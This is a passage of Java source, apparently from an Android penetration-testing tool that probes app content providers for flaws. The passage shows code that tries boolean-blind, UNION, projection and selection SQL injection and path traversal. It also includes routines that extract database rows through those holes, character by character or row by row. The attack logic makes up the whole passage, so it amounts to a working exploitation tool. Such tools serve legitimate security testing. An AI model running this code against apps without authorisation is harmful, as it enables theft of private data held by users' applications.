                logErr("Exception deleting cached vectors: " + de.getMessage());
            }
        }
        return status;
    }

    private boolean testVector(CPVector vector, ProviderInfo pInfo, LinkedHashSet<InjectionPayload> injectionPayloads, LinkedHashSet<UriPathPayload> uriPathPayloads) {

        /*
         * Use a distinct vector object for each test to ensure the original object reference is not
         * modified inadvertently
         */

        boolean gotHeuristic = false;
        boolean testVectorInjection = false;
        int numBoolVuln = 0;
        int numUnionVuln = 0;
        int numProjVuln = 0;
        int numSelVuln = 0;
        int numTravVuln = 0;

        // If the provider/vector is denied due to options, return false
        if ((getArrayListOption("providers") != null && !getArrayListOption("providers").contains(pInfo.name)) || (getArrayListOption("vectors") != null && !getArrayListOption("vectors").contains(vector.getTypeString()))) {
            return false;
        }

        Set<TestResult> heurRes = new HashSet<>();
        if (getBooleanOption("heuristic_detection")) {
            // Use original vector ref for heuristic test, as properties set will be inherited by copies
            heurRes.addAll(testHeuristic(vector, pInfo));
        }
        if (vector.getQuery() == null && getBooleanOption("blind_detection")) {
            // Perform blind detection test for supported vectors (wont have query set)
            heurRes.addAll(testBlindDetection(vector, pInfo));
        }

        if (heurRes.size() > 0) {
            gotHeuristic = true;
            for (TestResult heurResult : heurRes) {
                String query = heurResult.getVector().getQuery();
                if (query != null) {
                    logWarn(String.format("Got potentially vulnerable Uri: %s Type: %s (%s)", heurResult.getVector().getUri(), heurResult.getVector().getTypeString(), query));
                } else {
                    logWarn(String.format("Got potentially vulnerable Uri (via blind detection): %s Type: %s", heurResult.getVector().getUri(), heurResult.getVector().getTypeString()));
                }

                testVectorInjection = shouldTestVectorForInjection(heurResult.getVector());
                if (testVectorInjection) {
                    for (InjectionPayload injectionPayload : injectionPayloads) {
                        // Skip payloads based on options
                        if (getArrayListOption("payloads") != null && !getArrayListOption("payloads").contains(injectionPayload.getTypeString())) {
                            continue;
                        }

                        // Skip payloads ending in multiline comments (/*) for URI ID/SEGMENT vectors, as it messes up the URI
                        if ((vector.getType() == CPVector.URI_ID || vector.getType() == CPVector.URI_SEGMENT) && injectionPayload.endsWith("/*")) {
                            continue;
                        }

                        if (injectionPayload.getType() == BooleanBlindPayload.TYPE) {
                            // Boolean (query and update)
                            CPVector boolVector = heurResult.getVector().copy();
                            BooleanBlindPayload payload = (BooleanBlindPayload) injectionPayload;
                            QueryResult testResult = testBooleanBlindQuery(boolVector, payload, pInfo);
                            if (testResult.getStatus()) {
                                addTestResultToVulnMap(testResult);
                                numBoolVuln++;
                            }
                            UpdateResult testUpdResult = testBooleanBlindUpdate(boolVector, payload, pInfo);
                            if (testUpdResult.getStatus()) {
                                addTestResultToVulnMap(testUpdResult);
                                numBoolVuln++;
                            }
                        } else if (injectionPayload.getType() == UnionPayload.TYPE) {
                            // UNION
                            CPVector unionVector = heurResult.getVector().copy();
                            UnionPayload payload = (UnionPayload) injectionPayload;
                            QueryResult testResult = testUnion(unionVector, payload, pInfo);
                            if (testResult.getStatus()) {
                                addTestResultToVulnMap(testResult);
                                numUnionVuln++;
                            }
                        } else if (injectionPayload.getType() == ProjectionPayload.TYPE) {
                            // Projection
                            CPVector projectionVector = heurResult.getVector().copy();
                            ProjectionPayload payload = (ProjectionPayload) injectionPayload;
                            QueryResult testResult = testProjection(projectionVector, payload, pInfo);
                            if (testResult.getStatus()) {
                                addTestResultToVulnMap(testResult);
                                numProjVuln++;
                            }
                        } else if (injectionPayload.getType() == SelectionPayload.TYPE) {
                            // Selection
                            CPVector selectionVector = heurResult.getVector().copy();
                            SelectionPayload payload = (SelectionPayload) injectionPayload;
                            QueryResult testResult = testSelection(selectionVector, payload, pInfo);
                            if (testResult.getStatus()) {
                                addTestResultToVulnMap(testResult);
                                numSelVuln++;
                            }
                        }
                    }
                } else {
                    logWarn(String.format("Skipping injection tests for vector (%s) as a similar vulnerable vector already exists", heurResult.getVector()));
                }
            }
        }

        // Only test URI vectors
        if (vector.getType() == CPVector.URI_ID || vector.getType() == CPVector.URI_SEGMENT) {
            for (UriPathPayload uriPathPayload : uriPathPayloads) {
                if (uriPathPayload.getType() == PathTraversalPayload.TYPE) {
                    // Skip payloads based on options
                    if (getArrayListOption("payloads") != null && !getArrayListOption("payloads").contains(uriPathPayload.getTypeString())) {
                        continue;
                    }
                    // Skip already traversed and invalid vectors
                    if (invalidAuthorities.contains(Util.getAuthorityFromVector(vector)) || !hasProviderOrPathPermission(pInfo, true, vector.getUri())) {
                        continue;
                    }

                    // Traversal (doesnt need positive heuristic result)
                    CPVector travVector = vector.copy();
                    PathTraversalPayload payload = (PathTraversalPayload) uriPathPayload;
                    TestResult testResult = testPathTraversal(travVector, payload);
                    if (testResult.getStatus()) {
                        // If provider properties are not set, set them
                        if (testResult.getVector().getProviderClass() == null) {
                            testResult.getVector().setProviderProperties(pInfo);
                        }
                        addTestResultToVulnMap(testResult);
                        numTravVuln++;
                    }
                }
            }
        }

        if (numBoolVuln > 0) {
            logWarn("Found " + numBoolVuln + " boolean injection payloads for vector");
        }
        if (numUnionVuln > 0) {
            logWarn("Found " + numUnionVuln + " UNION injection payloads for vector");
        }
        if (numProjVuln > 0) {
            logWarn("Found " + numProjVuln + " projection injection payloads for vector");
        }
        if (numSelVuln > 0) {
            logWarn("Found " + numSelVuln + " selection injection payloads for vector");
        }
        if (numTravVuln > 0) {
            logWarn("Found " + numTravVuln + " path traversal payloads for vector");
        }

        if (gotHeuristic && testVectorInjection && (numBoolVuln == 0 && numUnionVuln == 0 && numProjVuln == 0 && numSelVuln == 0)) {
            // Got positive heuristic result but no valid injection payloads
            for (TestResult testResult : heurRes) {
                addTestResultToVulnMap(testResult);
            }
        }

        return numBoolVuln > 0 || numUnionVuln > 0 || numProjVuln > 0 || numSelVuln > 0 || numTravVuln > 0 || gotHeuristic;
    }

    private void addTestResultToVulnMap(TestResult testResult) {

        switch (testResult.getPayload().getType()) {
            case BooleanBlindPayload.TYPE:
                String op;
                if (testResult instanceof QueryResult) {
                    op = "query()";
                } else {
                    op = "update()";
                }
                logWarn("Found " + op + " vector (" + testResult.getVector() + ") vulnerable to boolean blind injection with payload: " + testResult.getPayload());
                break;
            case UnionPayload.TYPE:
                logWarn("Found query() vector (" + testResult.getVector() + ") vulnerable to UNION injection with payload: " + testResult.getPayload());
                break;
            case ProjectionPayload.TYPE:
                logWarn("Found query() vector (" + testResult.getVector() + ") vulnerable to projection injection with payload: " + testResult.getPayload());
                break;
            case SelectionPayload.TYPE:
                logWarn("Found query() vector (" + testResult.getVector() + ") vulnerable to selection injection with payload: " + testResult.getPayload());
                break;
            case PathTraversalPayload.TYPE:
                logWarn("Found vector (" + testResult.getVector() + ") vulnerable to path traversal with payload: " + testResult.getPayload());
                break;

        }

        if (!vulnMap.containsKey(testResult.getVector())) {
            vulnMap.put(testResult.getVector(), new LinkedHashSet<Payload>());
        }
        vulnMap.get(testResult.getVector()).add(testResult.getPayload());
    }

    private Set<?> getTestPayloads(int type) {
        switch (type) {
            case HeuristicPayload.TYPE:
                return HeuristicPayload.Payloads.getDefault();
            case BooleanBlindPayload.TYPE:
                return BooleanBlindPayload.Payloads.getDefault();
            case ProjectionPayload.TYPE:
                return ProjectionPayload.Payloads.getDefault();
            case UnionPayload.TYPE:
                return UnionPayload.Payloads.getDefault();
            case PathTraversalPayload.TYPE:
                return PathTraversalPayload.Payloads.getDefault();
            case SelectionPayload.TYPE:
                return SelectionPayload.Payloads.getDefault();
            default:
                logWarn("Unknown payload type: " + type);
        }
        return null;
    }

    private QueryResult testProjection(CPVector vector, ProjectionPayload payload, ProviderInfo pInfo) {

        // Check vector is supported by the payload
        if (!payload.isSupportedVector(vector)) {
            return new QueryResult((Cursor) null, vector, payload);
        }

        ProjectionPayload.Builder projBuilder = new ProjectionPayload.Builder(payload, vector);
        projBuilder.setField("*");
        String vectorTable = projBuilder.getVector().getTable();
        projBuilder.setTable(vectorTable != null ? vectorTable : InjectionPayload.getDefaultTable());

        if (hasProviderOrPathPermission(pInfo, true, projBuilder.getVector().getUri())) {
            Cursor projCur = null;
            try {
                CPVector projVector = projBuilder.getRenderedVector();
                projCur = query(projVector.getUri(), projVector.getProjection(), projVector.getWhere(), projVector.getSelectionArgs(), projVector.getSortOrder());
                if (projCur != null && projCur.getColumnNames().length > 0 && projBuilder.getVector().getTable() != null) {
                    // Valid if the query returns a non null cursor and >0 column names
                    return new QueryResult(projCur, projBuilder.getVector(), projBuilder.build());
                }
            } catch (Exception e) {
                if (e.getMessage() != null) {
                    if (e.getMessage().contains("no such column: rowid")) {
                        // WITHOUT ROWID tables (https://www.sqlite.org/withoutrowid.html)? Modify in-place and retry
                        logWarn("'no such column: rowid' error returned for projection query, probable WITHOUT ROWID table");
                        if (projBuilder.handleWithoutRowid(projBuilder.getVector())) {
                            return testProjection(projBuilder.getVector(), projBuilder.build(), pInfo);
                        }
                    } else if (e.getMessage().contains("Cannot bind argument")) {
                        if (projBuilder.build().getConditions().size() < DISCOVER_COLCOND_LIMIT) {
                            projBuilder.addPlaceholderCondition();
                            logWarn("'Cannot bind argument' error returned for projection query, added condition/placeholder to payload, now: " + projBuilder.build());
                            return testProjection(projBuilder.getVector(), projBuilder.build(), pInfo);
                        } else {
                            logWarn("'Cannot bind argument' error returned for projection query, given up adding condition/placeholder to payload :(");
                        }
                    } else {
                        handleUnexpectedTestException(e, projBuilder.getVector(), projBuilder.build());
                    }
                }
            } finally {
                if (projCur != null) {
                    projCur.close();
                }
            }
        }

        return new QueryResult((Cursor) null, projBuilder.getVector(), projBuilder.build());

    }

    private QueryResult testSelection(CPVector vector, SelectionPayload payload, ProviderInfo pInfo) {

        // Check vector is supported by the payload
        if (!payload.isSupportedVector(vector)) {
            return new QueryResult((Cursor) null, vector, payload);
        }

        SelectionPayload.Builder selBuilder = new SelectionPayload.Builder(payload, vector);

        if (hasProviderOrPathPermission(pInfo, true, selBuilder.getVector().getUri())) {
            Cursor selCur = null;
            try {
                CPVector selVector = selBuilder.getRenderedVector();
                selCur = query(selVector.getUri(), selVector.getProjection(), selVector.getWhere(), selVector.getSelectionArgs(), selVector.getSortOrder());
                if (selCur != null && selCur.getCount() > 0) {
                    // Check any row
                    String[] row = getRow(selCur, 0);
                    for (String field : row) {
                        if (field != null && field.equals(selBuilder.build().getExpectedOutput())) {
                            return new QueryResult(selCur, selBuilder.getVector(), selBuilder.build());
                        }
                    }
                }
            } catch (Exception e) {
                if (e.getMessage() != null) {
                    if (e.getMessage().contains("no such column: rowid")) {
                        // WITHOUT ROWID tables (https://www.sqlite.org/withoutrowid.html)? Modify in-place and retry
                        logWarn("'no such column: rowid' error returned for UNION query, probable WITHOUT ROWID table");
                        if (selBuilder.handleWithoutRowid(selBuilder.getVector())) {
                            return testSelection(selBuilder.getVector(), selBuilder.build(), pInfo);
                        }
                    } else {
                        handleUnexpectedTestException(e, selBuilder.getVector(), selBuilder.build());
                    }
                }
            } finally {
                if (selCur != null) {
                    selCur.close();
                }
            }
        }

        return new QueryResult((Cursor) null, selBuilder.getVector(), selBuilder.build());
    }

    private QueryResult testUnion(CPVector vector, UnionPayload payload, ProviderInfo pInfo) {

        // Check vector is supported by the payload
        if (!payload.isSupportedVector(vector)) {
            return new QueryResult((Cursor) null, vector, payload);
        }

        UnionPayload.Builder uniBuilder = new UnionPayload.Builder(payload, vector);

        if (hasProviderOrPathPermission(pInfo, true, uniBuilder.getVector().getUri())) {
            Cursor uniCur = null;
            try {
                CPVector uniVector = uniBuilder.getRenderedVector();
                uniCur = query(uniVector.getUri(), uniVector.getProjection(), uniVector.getWhere(), uniVector.getSelectionArgs(), uniVector.getSortOrder());
                if (uniCur != null && uniCur.getCount() > 0) {
                    // Check last row
                    String[] row = getRow(uniCur, uniCur.getCount() - 1);
                    for (String field : row) {
                        if (field != null && field.equals(uniBuilder.build().getExpectedOutput())) {
                            return new QueryResult(uniCur, uniBuilder.getVector(), uniBuilder.build());
                        }
                    }
                }
            } catch (Exception e) {
                if (e.getMessage() != null) {
                    if (e.getMessage().contains("do not have the same number of result columns")) {
                        if (uniBuilder.build().getCols().size() < DISCOVER_COLCOND_LIMIT) {
                            uniBuilder.addCol();
                            logWarn("Adding column to UNION payload: " + uniBuilder.build().getPayload());
                            return testUnion(uniBuilder.getVector(), uniBuilder.build(), pInfo);
                        }
                    } else if (e.getMessage().contains("no such column: rowid")) {
                        // WITHOUT ROWID tables (https://www.sqlite.org/withoutrowid.html)? Modify in-place and retry
                        logWarn("'no such column: rowid' error returned for UNION query, probable WITHOUT ROWID table");
                        if (uniBuilder.handleWithoutRowid(uniBuilder.getVector())) {
                            return testUnion(uniBuilder.getVector(), uniBuilder.build(), pInfo);
                        }
                    } else if (e.getMessage().contains("no such column:")) {
                        // This occurs when there are conditions from the original query to the right of the UNION SELECT. The UNION clause does not include them so they are unknown
                        // Add a fake column alias to the the UNION clause i.e. SELECT (122+1) AS something, NULL AS type, NULL AS another
                        Pattern p = Pattern.compile("no such column:\\s+([\\w-_]+)\\s+");
                        Matcher m = p.matcher(e.getMessage());
                        if (m.find()) {
                            String missingCol = m.group(1);
                            if (!uniBuilder.build().getColAliases().contains(missingCol)) {
                                uniBuilder.addColAlias(missingCol);
                                logWarn("Adding column alias for missing field: " + missingCol);
                                return testUnion(uniBuilder.getVector(), uniBuilder.build(), pInfo);
                            }
                        }
                    } else if (e.getMessage().contains("Cannot bind argument")) {
                        if (uniBuilder.build().getConditions().size() < DISCOVER_COLCOND_LIMIT) {
                            uniBuilder.addPlaceholderCondition();
                            logWarn("'Cannot bind argument' error returned for UNION query, added condition/placeholder to payload, now: " + uniBuilder.build());
                            return testUnion(uniBuilder.getVector(), uniBuilder.build(), pInfo);
                        } else {
                            logWarn("'Cannot bind argument' error returned for UNION query, given up adding condition/placeholder to payload :(");
                        }
                    } else {
                        handleUnexpectedTestException(e, uniBuilder.getVector(), uniBuilder.build());
                    }
                }
            } finally {
                if (uniCur != null) {
                    uniCur.close();
                }
            }
        }

        return new QueryResult((Cursor) null, uniBuilder.getVector(), uniBuilder.build());

    }

    private String[] getBlindRow(CPVector vector, BooleanBlindPayload payload, String sql, ProviderInfo providerInfo, int rowNum) {
        String dumpSql;
        String[] rowArray = null;
        if (sql.trim().toLowerCase().contains(" from ")) {
            dumpSql = sql + " LIMIT 1 OFFSET " + rowNum;
        } else {
            dumpSql = sql;
        }
        boolean concatFields = true;
        // Init ThreadPoolExecutor for the callables
        BlockingQueue<Runnable> blockingQueue = new ArrayBlockingQueue<>(50);
        ThreadPoolExecutor executor = new ThreadPoolExecutor(10, 10, 1000, TimeUnit.MILLISECONDS, blockingQueue, new ThreadPoolExecutor.CallerRunsPolicy());
        // Get length of concatenated row data
        int rowLen = getBlindNumericVal(vector, payload, dumpSql, providerInfo, BNUMTYPE_LENGTH);
        if (rowLen < 0) {
            logWarn("Couldnt get length of row data");
            return null;
        } else {
            logInf("Row length (all concatenated values): " + rowLen);
            if (rowLen == 0) {
                // If row length returned as 0, check sum of all fields requested as a fallback
                QueryParser qp = new QueryParser(sql);
                ArrayList<String> fields = qp.getCols(null);
                int[] fieldLens = new int[fields.size()];
                String from = qp.getFrom();
                String order = "";
                if (getStringOption("dump_order") != null) {
                    order = " ORDER BY " + getStringOption("dump_order");
                }
                if (fields.size() > 0 && from != null) {
                    int allFieldLen = 0;
                    for (int j = 0; j < fields.size(); j++) {
                        fieldLens[j] = getBlindNumericVal(vector, payload, "SELECT " + fields.get(j) + " FROM " + from + order + " LIMIT 1 OFFSET " + rowNum, providerInfo, BNUMTYPE_LENGTH);
                        allFieldLen += fieldLens[j];
                    }
                    if (allFieldLen > rowLen) {
                        concatFields = false;
                        StringBuilder row = new StringBuilder();
                        logWarn("Field concat query failed, getting fields individually..");
                        for (int j = 0; j < fields.size(); j++) {
                            if (j > 0) {
                                row.append(ROW_CONCAT_DELIM);
                            }
                            logInf("Getting field: " + fields.get(j));
                            if (fieldLens[j] > 0) {
                                List<BlindSqlDumpCharCallable> callList = new ArrayList<>();
                                // Field has data, get it
                                for (int k = 0; k < fieldLens[j]; k++) {
                                    String charQuery = String.format(Locale.UK, "SELECT unicode(substr((%s), %d, 1))", "SELECT " + fields.get(j) + " FROM " + from + order + " LIMIT 1 OFFSET " + rowNum, (k + 1));
                                    callList.add(new BlindSqlDumpCharCallable(vector, payload, charQuery, providerInfo, k));
                                }

                                if (callList.size() > 0) {
                                    try {
                                        logInf("Queuing " + callList.size() + " thread(s) for blind char retrieval");
                                        // invokeAll() should block until all are complete, or timeout after 15 mins
                                        List<Future<BlindSqlDumpCharCallable>> futures = executor.invokeAll(callList, 30, TimeUnit.MINUTES);

                                        HashMap<Integer, Character> charMap = new HashMap<>();

                                        // Threads have finished
                                        logInf("Char retrieval threads have finished");
                                        for (Future<BlindSqlDumpCharCallable> future : futures) {
                                            try {
                                                BlindSqlDumpCharCallable res = future.get();
                                                if (res != null && res.chr > 0 && res.chr < 127) {
                                                    charMap.put(res.charIndex, res.chr);
                                                } else if (res != null) {
                                                    charMap.put(res.charIndex, '?');
                                                }
                                            } catch (ExecutionException ee) {
                                                logErr("ExecutionException: " + ee.getMessage());
                                            } catch (CancellationException ce) {
                                                logErr("CancellationException: " + ce.getMessage());
                                            }
                                        }

                                        // Add the ordered chars, ignoring null chars
                                        for (int i = 0; i < charMap.size(); i++) {
                                            if (charMap.containsKey(i) && charMap.get(i) != null) {
                                                row.append(charMap.get(i));
                                            }
                                        }
                                    } catch (InterruptedException ie) {
                                        logErr("InterruptedException: " + ie.getMessage());
                                    }
                                }
                            }
                        }
                        // Got all fields in the row
                        if (row.toString().trim().length() > 0) {
                            if (row.toString().contains(ROW_CONCAT_DELIM)) {
                                rowArray = row.toString().split(ROW_CONCAT_DELIM, -1);
                            } else {
                                rowArray = new String[] {row.toString()};
                            }
                        } else {
                            logWarn("Row " + (rowNum + 1) + " was empty");
                        }
                    }
                }
            }
        }
        if (concatFields) {
            StringBuilder row = new StringBuilder();
            List<BlindSqlDumpCharCallable> callList = new ArrayList<>();
            for (int j = 0; j < rowLen; j++) {
                String charQuery = String.format(Locale.UK, "SELECT unicode(substr((%s), %d, 1))", dumpSql, (j + 1));
                callList.add(new BlindSqlDumpCharCallable(vector, payload, charQuery, providerInfo, j));
            }

            if (callList.size() > 0) {
                try {
                    logInf("Queuing " + callList.size() + " thread(s) for blind char retrieval");
                    // invokeAll() should block until all are complete, or timeout after 15 mins
                    List<Future<BlindSqlDumpCharCallable>> futures = executor.invokeAll(callList, 30, TimeUnit.MINUTES);

                    HashMap<Integer, Character> charMap = new HashMap<>();

                    // Threads have finished
                    logInf("Char retrieval threads have finished");
                    for (Future<BlindSqlDumpCharCallable> future : futures) {
                        try {
                            BlindSqlDumpCharCallable res = future.get();
                            if (res != null && res.chr > 0 && res.chr < 127) {
                                charMap.put(res.charIndex, res.chr);
                            } else if (res != null) {
                                charMap.put(res.charIndex, '?');
                            }
                        } catch (ExecutionException ee) {
                            logErr("ExecutionException: " + ee.getMessage());
                        } catch (CancellationException ce) {
                            logErr("CancellationException: " + ce.getMessage());
                        }
                    }

                    // Add the ordered chars, ignoring null chars
                    for (int i = 0; i < charMap.size(); i++) {
                        if (charMap.containsKey(i) && charMap.get(i) != null) {
                            row.append(charMap.get(i));
                        }
                    }
                } catch (InterruptedException ie) {
                    logErr("InterruptedException: " + ie.getMessage());
                }
            }

            if (row.toString().trim().length() > 0) {
                if (row.toString().contains(ROW_CONCAT_DELIM)) {
                    rowArray = row.toString().split(ROW_CONCAT_DELIM, -1);
                } else {
                    rowArray = new String[] {row.toString()};
                }
            } else {
                logWarn("Row " + (rowNum + 1) + " was empty");
            }
        }
        return rowArray;
    }

    private ArrayList<String[]> getBlindRows(CPVector vector, BooleanBlindPayload payload, String sql) {
        ArrayList<String[]> rows = new ArrayList<>();
        ProviderInfo providerInfo = getProviderInfo(vector.getUri().getAuthority());
        logWarn("Dumping data for query (" + sql + ") using boolean blind technique, please be patient..");
        // Get number of rows
        int numRows = getBlindNumericVal(vector, payload, sql, providerInfo, BNUMTYPE_COUNT);
        if (numRows < 1) {
            logWarn("No rows returned for query");
            return rows;
        } else {
            if (getIntegerOption("dump_limit") != null && numRows > getIntegerOption("dump_limit")) {
                numRows = getIntegerOption("dump_limit");
            }
            logInf("Query will return " + numRows + " row(s)");
        }
        int fromIndex = sql.toLowerCase().indexOf(" from ");
        if (fromIndex != -1 && sql.substring(0, fromIndex).contains(",")) {
            sql = sql.substring(0, fromIndex).replace(",", " || '" + ROW_CONCAT_DELIM + "' || ") + sql.substring(fromIndex);
            logInf("Modifying query to use concatenation: " + sql);
        }

        // Init ThreadPoolExecutor for the callables
        BlockingQueue<Runnable> blockingQueue = new ArrayBlockingQueue<>(50);
        ThreadPoolExecutor executor = new ThreadPoolExecutor(5, 5, 1000, TimeUnit.MILLISECONDS, blockingQueue, new ThreadPoolExecutor.CallerRunsPolicy());

        List<BlindSqlDumpRowCallable> callList = new ArrayList<>();
        for (int i = 0; i < numRows; i++) {
            callList.add(new BlindSqlDumpRowCallable(vector, payload, sql, providerInfo, i));
        }

        if (callList.size() > 0) {
            try {
                logInf("Queuing " + callList.size() + " thread(s) for blind row retrieval");
                // invokeAll() should block until all are complete, or timeout after 15 mins
                List<Future<BlindSqlDumpRowCallable>> futures = executor.invokeAll(callList, 30, TimeUnit.MINUTES);

                HashMap<Integer, String[]> rowMap = new HashMap<>();

                // Threads have finished
                logInf("Row retrieval threads have finished");
                for (Future<BlindSqlDumpRowCallable> future : futures) {
                    try {
                        BlindSqlDumpRowCallable res = future.get();
                        if (res != null) {
                            rowMap.put(res.rowIndex, res.row);
                        }
                    } catch (ExecutionException ee) {
                        logErr("ExecutionException: " + ee.getMessage());
                    } catch (CancellationException ce) {
                        logErr("CancellationException: " + ce.getMessage());
                    }
                }

                // Add the ordered rows, ignoring null rows
                for (int i = 0; i < rowMap.size(); i++) {
                    if (rowMap.containsKey(i) && rowMap.get(i) != null) {
                        rows.add(rowMap.get(i));
                    }
                }
            } catch (InterruptedException ie) {
                logErr("InterruptedException: " + ie.getMessage());
            }
        }

        return rows;
    }

    private int getBlindNumericVal(CPVector vector, BooleanBlindPayload payload, String sql, ProviderInfo providerInfo, int type) {
        int min = 0;
        int window = 127;
        String numQuery;
        switch (type) {
            case BNUMTYPE_COUNT:
                // Numeric val comes from COUNT(*) of subquery
                numQuery = " (SELECT COUNT(*) FROM (%s)) BETWEEN %d AND %d";
                break;
            case BNUMTYPE_LENGTH:
                // Numeric val comes from result length
                numQuery = " (SELECT length((%s))) BETWEEN %d AND %d";
                break;
            case BNUMTYPE_RESULT:
                // Numeric val comes from result
                numQuery = " (%s) BETWEEN %d AND %d";
                break;
            default:
                logWarn("Invalid type: " + type);
                return -1;
        }

        while (true) {
            String payloadString = payload.getOperator() + String.format(Locale.UK, numQuery, sql, min, min + window);
            int whileRes = -1;
            if (vector.isUpdate()) {
                whileRes = getUpdateResult(true, payloadString, vector, payload, providerInfo).getResult();
            } else if (vector.isQuery()) {
                CursorMeta curData = getBooleanQuery(true, payloadString, vector, payload, providerInfo).getCursorMeta();
                if (!curData.isNull()) {
                    whileRes = curData.getNumRows();
                }
            }

            if (whileRes == -1) {
                // Result should only ever be boolean true/false (1+/0), if not return -1
                return -1;
            }

            if (whileRes > 0) {
                if (window == 0) {
                    // Got result
                    return min;
                } else {
                    // True, reduce window
                    if (window > 3) {
                        window = window / 2;
                    } else {
                        window--;
                    }
                }
            } else {
                if (window > 0) {
                    // False, min becomes last max
                    min = min + window;
                } else {
                    min++;
                }
            }
        }
    }

    private ArrayList<String[]> getSelectionRows(CPVector vector, SelectionPayload payload, String sql) {
        // Get selection rows 1 at a time with LIMIT/OFFSET
        ArrayList<String[]> rows = new ArrayList<>();
        int qCount = -1;
        int plCol = -1;
        Cursor cur = null;
        int fromIndex = sql.toLowerCase().indexOf(" from ");
        if (fromIndex != -1 && sql.substring(0, fromIndex).contains(",")) {
            sql = sql.substring(0, fromIndex).replace(",", " || '" + ROW_CONCAT_DELIM + "' || ") + sql.substring(fromIndex);
            logInf("Modifying query to use concatenation: " + sql);
        }
        try {
            // Get num of records to return
            SelectionPayload.Builder selBuilder = new SelectionPayload.Builder(payload, vector);
            selBuilder.setInput("SELECT COUNT(*) FROM (" + sql + ")");
            // Check if the query vector already has an alias, if so record it
            String queryVectorAlias = new QueryParser(vector).getInjectionVectorAlias();
            if (queryVectorAlias == null) {
                // No alias already, so set one in the payload
                queryVectorAlias = "CPMap";
                selBuilder.setAlias(queryVectorAlias);
            }
            CPVector testVectorCount = selBuilder.getRenderedVector();
            cur = query(testVectorCount.getUri(), testVectorCount.getProjection(), testVectorCount.getWhere(), testVectorCount.getSelectionArgs(), testVectorCount.getSortOrder());
            if (cur != null && cur.getCount() > 0) {
                plCol = cur.getColumnIndex(queryVectorAlias);
                if (plCol == -1) {
                    logErr("Couldnt find the alias for selection payload! Giving up");
                    return null;
                }
                // Check any row
                String[] row = getRow(cur, 0);
                String field = row[plCol];
                if (field != null) {
                    qCount = Integer.parseInt(field);
                }
                if (getIntegerOption("dump_limit") != null && qCount > getIntegerOption("dump_limit")) {
                    qCount = getIntegerOption("dump_limit");
                }
            }

            if (qCount > 0) {
                logInf("Query will return " + qCount + " row(s)");
            } else if (qCount == 0) {
                logInf("Query will return no rows");
                return null;
            } else if (qCount == -1) {
                logWarn("Cannot determine the number of rows to return");
                return null;
            }

            for (int i = 0; i < qCount; i++) {
                selBuilder.setInput(sql);
                selBuilder.setRow(i + 1);
                CPVector testVector = selBuilder.getRenderedVector();
                cur = query(testVector.getUri(), testVector.getProjection(), testVector.getWhere(), testVector.getSelectionArgs(), testVector.getSortOrder());
                if (cur != null && cur.getCount() > 0) {
                    // Assume if it works the first time its fine here too..
                    plCol = cur.getColumnIndex(queryVectorAlias);
                    // Check any row
                    String[] row = getRow(cur, 0);
                    if (row[plCol] != null && row[plCol].contains(ROW_CONCAT_DELIM)) {
                        rows.add(row[plCol].split(ROW_CONCAT_DELIM, -1));
                    } else if (row[plCol] != null && !row[plCol].contains(ROW_CONCAT_DELIM)) {
                        rows.add(new String[] {row[plCol]});
                    } else {
                        logWarn("Row " + (i + 1) + " was empty");
                    }
                }
            }
        } catch (Exception e) {
            handleUnexpectedTestException(e, vector, payload);
        } finally {
            if (cur != null) {
                cur.close();
            }
        }
        return rows;
    }

    private ArrayList<String[]> getUnionRows(CPVector vector, UnionPayload payload, String sql) {
        // Get UNION rows 1 at a time with LIMIT/OFFSET
        ArrayList<String[]> rows = new ArrayList<>();
        int qCount;
        Cursor cur = null;
        int fromIndex = sql.toLowerCase().indexOf(" from ");
        if (fromIndex != -1 && sql.substring(0, fromIndex).contains(",")) {
            sql = sql.substring(0, fromIndex).replace(",", " || '" + ROW_CONCAT_DELIM + "' || ") + sql.substring(fromIndex);
            logInf("Modifying query to use concatenation: " + sql);
        }
        try {
            // Get num of records to return
            int plCol = payload.getPayloadCol();
            UnionPayload.Builder uniBuilder = new UnionPayload.Builder(payload, vector);
            uniBuilder.setInput("(SELECT COUNT(*) FROM (" + sql + ") LIMIT 1 OFFSET 0)");
            CPVector testVectorCount = uniBuilder.getRenderedVector();
            cur = query(testVectorCount.getUri(), testVectorCount.getProjection(), testVectorCount.getWhere(), testVectorCount.getSelectionArgs(), testVectorCount.getSortOrder());
            if (cur != null && cur.getCount() > 0) {
                // Check last row
                String[] row = getRow(cur, cur.getCount() - 1);
                qCount = Integer.parseInt(row[plCol]);
                if (getIntegerOption("dump_limit") != null && qCount > getIntegerOption("dump_limit")) {
                    qCount = getIntegerOption("dump_limit");
                }
                logInf("Query will return " + qCount + " row(s)");
            } else {
                logWarn("Cannot determine the number of rows to return");
                return null;
            }

            for (int i = 0; i < qCount; i++) {
                String dumpSql;
                if (fromIndex != -1) {
                    dumpSql = sql + " LIMIT 1 OFFSET " + i;
                } else {
                    dumpSql = sql.trim();
                }

                boolean concatRow = false;
                // Check row length for query first
                uniBuilder.setInput("(SELECT LENGTH((" + dumpSql + ")))");
                CPVector rowLenVector = uniBuilder.getRenderedVector();
                cur = query(rowLenVector.getUri(), rowLenVector.getProjection(), rowLenVector.getWhere(), rowLenVector.getSelectionArgs(), rowLenVector.getSortOrder());
                if (cur != null && cur.getCount() > 0) {
                    // Check last row
                    String[] row = getRow(cur, cur.getCount() - 1);
                    if (row[plCol] != null) {
                        try {
                            int rowLen = Integer.parseInt(row[plCol]);
                            logInf("Row length for row " + (i + 1) + ": " + rowLen);
                            if (rowLen > 0) {
                                concatRow = true;
                            }
                        } catch (Exception e) {
                            logErr("Exception getting row length for row " + (i + 1) + ": " + e.getMessage());
                        }
                    } else {
                        logWarn("Could not get row length for row " + (i + 1));
                    }
                }

                if (concatRow) {
                    uniBuilder.setInput("(" + dumpSql + ")");
                    CPVector testVector = uniBuilder.getRenderedVector();
                    cur = query(testVector.getUri(), testVector.getProjection(), testVector.getWhere(), testVector.getSelectionArgs(), testVector.getSortOrder());
                    if (cur != null && cur.getCount() > 0) {
                        // Check last row
                        String[] row = getRow(cur, cur.getCount() - 1);
                        if (row[plCol] != null && row[plCol].contains(ROW_CONCAT_DELIM)) {
                            rows.add(row[plCol].split(ROW_CONCAT_DELIM, -1));
                        } else if (row[plCol] != null && !row[plCol].contains(ROW_CONCAT_DELIM)) {
                            rows.add(new String[]{row[plCol]});
                        } else {
                            logWarn("Row " + (i + 1) + " was empty");
                        }
                    }
                } else {
                    logWarn("Unable to get the length of the row, will attempt to get fields individually");
                    // If row length returned as <=0, get fields individually as a fallback
                    QueryParser qp = new QueryParser(sql);
                    ArrayList<String> fields = qp.getCols(null);
                    String from = qp.getFrom();
                    String order = "";
                    if (getStringOption("dump_order") != null) {
                        order = " ORDER BY " + getStringOption("dump_order");
                    }
